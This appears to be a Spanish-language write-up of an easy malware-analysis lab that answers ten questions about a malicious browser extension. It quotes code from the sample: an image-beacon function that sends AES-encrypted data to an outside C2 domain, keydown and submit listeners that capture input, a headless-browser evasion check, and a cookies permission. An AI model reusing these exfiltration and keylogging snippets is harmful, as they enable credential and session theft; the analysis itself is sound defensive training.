`dificultad: easy`
`Tema: Malware Analysis`

Tras descomprimir la extensión original y empaquetarla de nuevo sin encriptar para su inspección en _CRX Viewer_, se obtuvieron los siguientes archivos de código fuente y configuración:

`app.js` · `crypto.js` · `loader.js` · `manifest.json` · `ui.html` · `img.GIF`
### Q1. Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?
`Respuesta: base64`

Al revisar  `crypto.js`, se observa que las cadenas  encriptadas mediante AES se codifican en Base64 para su posterior representación o transporte:

```js
1. (function() {  
2.     window.CryptoUtils = {
3.         encrypt: function(data) {
4.             const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123'); 
5.             const iv = CryptoJS.lib.WordArray.random(16); 
6.             const encrypted = CryptoJS.AES.encrypt(data, key, {
7.                 iv: iv
8.             });
9.             return encrypted.toString(CryptoJS.enc.Base64);
10.         }
11.     };
12. })();
```

### Q2. Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?
`Respuesta: www.facebook.com`

Dentro de `app.js` se localizó  `targets`, cuyos valores estaban en Base64

```js
const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
```

Al decodificar la cadena:
```bash
echo "d3d3LmZhY2Vib29rLmNvbQ==" | base64 -d
# Resultado: www.facebook.com
```

### Q3. Which type of HTML element is utilized by the extension to send stolen data?
`Respuesta: <img>`

La extensión utiliza una técnica de exfiltración de datos mediante peticiones `GET`  simulando la carga de un .gif

```js
function sendToServer(encryptedData) {
    var img = new Image();
    img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData); 
    document.body.appendChild(img);
}
```

Al instanciar `new Image()` y adjuntarlo al DOM (`document.body.appendChild`), el navegador genera internamente una etiqueta HTML **`<img>`** para realizar la petición hacia el servidor C2 .

### Q4. What is the first specific condition in the code that triggers the extension to deactivate itself?
`Respuesta: avigator.plugins.length === 0`

En el archivo `loader.js` se implementa una técnica de evasión de entornos sandbox . La primera condición evalúa la cantidad de plugins instalados en el navegador:

```js
     if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
         alert("Virtual environment detected. Extension will disable itself.");

         chrome.runtime.onMessage.addListener(() => {
             return false;
         }); 
     }
```


### Q5. Which event does the extension capture to track user input submitted through forms?
`Respuesta: submit`

Para obtener información de la web se utiliza la función `addEventListener` donde se ha de interactuar con algo, en este caso se hace al enviar información.
```js
document.addEventListener('submit', function(event) {
   //relleno
});
```


### Q6.  Which API or method does the extension use to capture and monitor user keystrokes?
`Respuesta: Keydown`

Básicamente coge información cuando pulsas una tecla
`document.addEventListener('keydown', function(event)`

### Q7. What is the domain where the extension transmits the exfiltrated data?
`Rspuesta: Mo.Elshaheedy.com`

Corresponde al C2 de la amenaza, identificado previamente en la función de transporte `sendToServer()` del archivo `app.js`

```js
img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
```
### Q8. Which function in the code is used to exfiltrate user credentials, including the username and password?
`Respuesta: exfiltrateCredentials(username, password);`

Dentro del archivo `app.js` aparece declarada la función
```js
function exfiltrateCredentials(username, password) {
    // Proceso de cifrado y exfiltración hacia el C2
}
```

### Q9.  Which encryption algorithm is applied to secure the data before sending?
`Respuesta: AES`

Mismo algoritmo que se uso para la URL facebook

```js
const encrypted = CryptoJS.AES.encrypt(data, key, {
	iv: iv
});
```

### Q10.  What does the extension access to store or manipulate session-related data and authentication information?
`Respuesta: cookies`

Al inspeccionar  `manifest.json`, se identifican permisos en `"permissions"`, donde está el acceso directo al API de cookies del navegador para robo de sesiones:
```json
"permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage",
    "webRequest",
    "webRequestBlocking",
    "cookies"
],
```

